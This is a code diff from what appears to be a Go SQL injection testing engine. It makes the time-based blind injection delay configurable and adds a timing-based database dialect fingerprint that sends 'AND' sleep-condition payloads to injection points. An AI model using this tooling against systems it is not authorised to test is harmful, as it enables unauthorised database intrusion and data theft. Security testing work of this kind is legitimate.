@@ -124,8 +124,12 @@ func (e *Engine) testBoundaryBoolean(point InjectionPoint, c BoundaryCandidate, 
 
 func (e *Engine) testBoundaryTime(point InjectionPoint, c BoundaryCandidate) bool {
 	baseline := e.baselineLatency(point)
+	delay := e.Opts.TimeSecs
+	if delay <= 0 {
+		delay = 3
+	}
 	for _, d := range Dialects() {
-		payload := c.Prefix + " AND " + d.TimeCondition("1=1", 3) + c.Suffix
+		payload := c.Prefix + " AND " + d.TimeCondition("1=1", delay) + c.Suffix
 		samples := []time.Duration{}
 		for i := 0; i < 2; i++ {
 			_, _, _, err := e.RequestAt(point, payload)
@@ -137,7 +141,7 @@ func (e *Engine) testBoundaryTime(point InjectionPoint, c BoundaryCandidate) boo
 		if len(samples) < 2 {
 			continue
 		}
-		if medianDuration(samples) > baseline+2*time.Second {
+		if medianDuration(samples) > baseline+delayThreshold(delay) {
 			return true
 		}
 	}
@@ -258,7 +262,31 @@ func (e *Engine) IdentifyDBMS(session *Session) {
 	// When neither UNION nor error output is available, use the confirmed
 	// boolean oracle to test a dialect-specific expression. This is a
 	// fingerprint, not a full extraction, so it stays cheap.
-	e.identifyDBMSBlind(session)
+	if strings.EqualFold(session.Technique, "time") && e.identifyDBMSTime(session) {
+		return
+	}
+	if e.identifyDBMSBlind(session) {
+		return
+	}
+	// A target that only answers through response timing needs a timing
+	// fingerprint instead of a boolean one.
+	e.identifyDBMSTime(session)
+}
+
+// identifyDBMSTime finds the dialect whose delay primitive actually works. It
+// is used when the target suppresses all boolean and in-band differences.
+func (e *Engine) identifyDBMSTime(session *Session) bool {
+	for _, d := range Dialects() {
+		probe := *session
+		probe.DBMS = d.Name
+		probe.Technique = "time"
+		exec := NewExecutor(e, &probe)
+		if exec.timeOracle("1=1") {
+			session.DBMS = d.Name
+			return true
+		}
+	}
+	return false
 }
 
 func (e *Engine) identifyDBMSBlind(session *Session) bool {
